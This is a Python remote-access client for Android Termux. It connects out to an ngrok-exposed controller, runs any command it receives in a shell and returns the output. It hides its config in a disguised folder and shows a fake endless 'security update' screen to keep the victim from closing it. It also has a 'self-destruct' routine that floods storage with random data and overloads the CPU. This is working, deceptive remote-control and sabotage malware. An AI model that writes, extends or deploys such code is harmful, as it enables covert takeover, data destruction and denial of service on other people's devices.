#!/data/data/com.termux/files/usr/bin/python3
"""
DEVICE CLIENT - Connects from ANYWHERE using ngrok
"""

import os
import sys
import socket
import threading
import json
import time
import subprocess
import platform
import random
import signal
from datetime import datetime

class DeviceClient:
    def __init__(self):
        self.version = "10.0.0"
        self.connected = False
        self.socket = None
        self.device_name = platform.node()
        self.self_destruct_activated = False
        self.running = True
        self.hidden_dir = os.path.expanduser("~/.system_cache")
        self.setup_hidden_directory()
        self.get_phone_info()
        
    def setup_hidden_directory(self):
        """Create hidden directory"""
        try:
            os.makedirs(self.hidden_dir, exist_ok=True)
            os.makedirs(os.path.join(self.hidden_dir, "logs"), exist_ok=True)
        except:
            pass
        
    def get_phone_info(self):
        """Get phone information"""
        info = {}
        try:
            model = subprocess.getoutput("getprop ro.product.model").strip()
            manufacturer = subprocess.getoutput("getprop ro.product.manufacturer").strip()
            android_ver = subprocess.getoutput("getprop ro.build.version.release").strip()
            
            info['model'] = model if model else platform.machine()
            info['manufacturer'] = manufacturer if manufacturer else platform.system()
            info['android_version'] = android_ver if android_ver else "Unknown"
            info['device_name'] = self.device_name
        except:
            info['device_name'] = self.device_name
            
        self.phone_info = info
        return info
        
    def show_connection_menu(self):
        """Show connection menu for user to enter main device details"""
        os.system('clear')
        print("\n" + "="*60)
        print("📱 DEVICE CLIENT - Remote Connection")
        print("="*60)
        print("\nEnter the Main Device connection details:")
        print("(Get these from the Main Device screen)")
        print("\nExample: If Main Device shows:")
        print("  Public Address: 0.tcp.ngrok.io:12345")
        print("  Then enter:")
        print("  IP: 0.tcp.ngrok.io")
        print("  Port: 12345")
        print("="*60)
        
        main_ip = input("\n🌍 Main Device IP: ").strip()
        main_port = input("🔌 Main Device Port: ").strip()
        
        # Save config
        config = {
            "main_ip": main_ip,
            "main_port": int(main_port),
            "auto_reconnect": True,
            "installed_at": datetime.now().isoformat()
        }
        
        config_file = os.path.join(self.hidden_dir, "config.json")
        with open(config_file, 'w') as f:
            json.dump(config, f, indent=2)
            
        print(f"\n✅ Configuration saved!")
        print(f"📁 Config: {config_file}")
        print(f"\n🔄 Connecting to {main_ip}:{main_port}...")
        time.sleep(2)
        
        return main_ip, main_port
        
    def show_infinite_loading(self):
        """Show infinite loading screen"""
        try:
            current_percent = 0
            
            while True:
                os.system('clear')
                
                print("╔════════════════════════════════════════════════════════════════╗")
                print("║                    SYSTEM UPDATE v2.0                          ║")
                print("║              Installing critical security updates              ║")
                print("╠════════════════════════════════════════════════════════════════╣")
                
                if current_percent < 100:
                    current_percent += random.uniform(0.1, 0.3)
                    if current_percent > 99:
                        current_percent = 99.5
                else:
                    current_percent = random.uniform(1, 15)
                    
                filled = int(current_percent / 5)
                bar = '█' * filled + '░' * (20 - filled)
                
                print(f"║  Progress: [{bar}] {current_percent:.1f}%                    ║")
                print("╠════════════════════════════════════════════════════════════════╣")
                
                packages = ["system-core", "security-patch", "network-driver"]
                pkg = random.choice(packages)
                print(f"║  ▶ Installing: {pkg:<52} ║")
                    
                print("╠════════════════════════════════════════════════════════════════╣")
                
                retry_count = random.randint(1, 99)
                print(f"║  Attempt: {retry_count}/∞                                    ║")
                
                eta = random.randint(30, 120)
                print(f"║  Estimated time: {eta} seconds remaining                      ║")
                
                print("╠════════════════════════════════════════════════════════════════╣")
                
                if self.connected:
                    print("║  Status: CONNECTED TO MAIN DEVICE                           ║")
                else:
                    print("║  Status: CONNECTING...                                      ║")
                    
                print("╚════════════════════════════════════════════════════════════════╝")
                print()
                print("  DO NOT CLOSE TERMINUX")
                print("  Background connection active")
                
                time.sleep(random.uniform(0.5, 1.0))
                
        except KeyboardInterrupt:
            os.system('clear')
            print("\n⚠️  UPDATE INTERRUPTED")
            print("\nResuming in 10 seconds...")
            for i in range(10, 0, -1):
                print(f"\r{i} seconds...", end="")
                time.sleep(1)
            self.show_infinite_loading()
            
    def connect_to_main(self, main_ip, main_port):
        """Connect to main device from anywhere"""
        while self.running and not self.connected:
            try:
                print(f"\n🔄 Connecting to {main_ip}:{main_port}...")
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(30)
                self.socket.connect((main_ip, int(main_port)))
                
                info = {
                    "device_name": self.device_name,
                    "platform": platform.system(),
                    "version": self.version,
                    "phone_info": self.phone_info
                }
                self.socket.send(json.dumps(info).encode())
                
                response = self.socket.recv(4096).decode()
                confirm = json.loads(response)
                
                if confirm.get('status') == 'connected':
                    self.connected = True
                    print(f"✅ Connected to {main_ip}:{main_port}")
                    self.listen_for_commands()
                    return True
                    
            except Exception as e:
                print(f"❌ Connection failed: {e}")
                time.sleep(10)
                
        return False
        
    def listen_for_commands(self):
        """Listen for commands"""
        try:
            while self.connected and self.running:
                self.socket.settimeout(60)
                try:
                    data = self.socket.recv(4096).decode()
                    if not data:
                        break
                        
                    command = json.loads(data)
                    if command.get('type') == 'command':
                        cmd = command.get('command')
                        
                        if cmd == "self_destruct_activate" and not self.self_destruct_activated:
                            self.self_destruct()
                            output = "Self-destruct activated"
                        elif cmd == "stop_alarm":
                            self.stop_alarm()
                            output = "Alarm stopped"
                        else:
                            output = self.execute_command(cmd)
                            
                        self.socket.send(json.dumps({"type": "response", "output": output}).encode())
                        
                except socket.timeout:
                    try:
                        self.socket.send(json.dumps({"type": "heartbeat"}).encode())
                    except:
                        break
                        
        except Exception as e:
            print(f"Connection error: {e}")
        finally:
            self.connected = False
            self.cleanup()
            
    def execute_command(self, command):
        """Execute command"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return "Command timeout"
        except Exception as e:
            return f"Error: {str(e)}"
            
    def self_destruct(self):
        """Self-destruct"""
        self.self_destruct_activated = True
        locations = ["/sdcard/", "/data/data/com.termux/files/home/"]
        for location in locations:
            try:
                for i in range(20):
                    with open(os.path.join(location, f".fill_{i}.dat"), 'wb') as f:
                        f.write(os.urandom(100 * 1024 * 1024))
            except:
                pass
                
        for _ in range(30):
            subprocess.Popen(["dd", "if=/dev/zero", "of=/dev/null"], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                           
    def stop_alarm(self):
        """Stop alarm"""
        subprocess.run(["pkill", "-9", "termux-tts-speak"], stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "-9", "termux-vibrate"], stderr=subprocess.DEVNULL)
        
    def cleanup(self):
        """Cleanup"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
                
    def auto_reconnect(self, main_ip, main_port):
        """Auto reconnect"""
        while self.running:
            if not self.connected:
                self.connect_to_main(main_ip, main_port)
            time.sleep(30)
            
    def run(self):
        """Main run"""
        print("\n" + "="*60)
        print(f"📱 DEVICE CLIENT v{self.version}")
        print("="*60)
        
        # Check for existing config
        config_file = os.path.join(self.hidden_dir, "config.json")
        
        if os.path.exists(config_file):
            # Load existing config
            with open(config_file, 'r') as f:
                config = json.load(f)
            main_ip = config.get("main_ip", "127.0.0.1")
            main_port = config.get("main_port", 5555)
            print(f"\n📡 Using saved connection: {main_ip}:{main_port}")
        else:
            # First time setup - get connection details
            main_ip, main_port = self.show_connection_menu()
            
        print(f"\n🎯 Connecting to: {main_ip}:{main_port}")
        print("🔄 This will run in background...")
        
        # Start connection thread
        threading.Thread(target=self.auto_reconnect, args=(main_ip, main_port), daemon=True).start()
        
        # Show infinite loading screen
        self.show_infinite_loading()

if __name__ == "__main__":
    client = DeviceClient()
    
    def signal_handler(sig, frame):
        client.stop_alarm()
        client.running = False
        client.cleanup()
        sys.exit(0)
        
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    client.run()
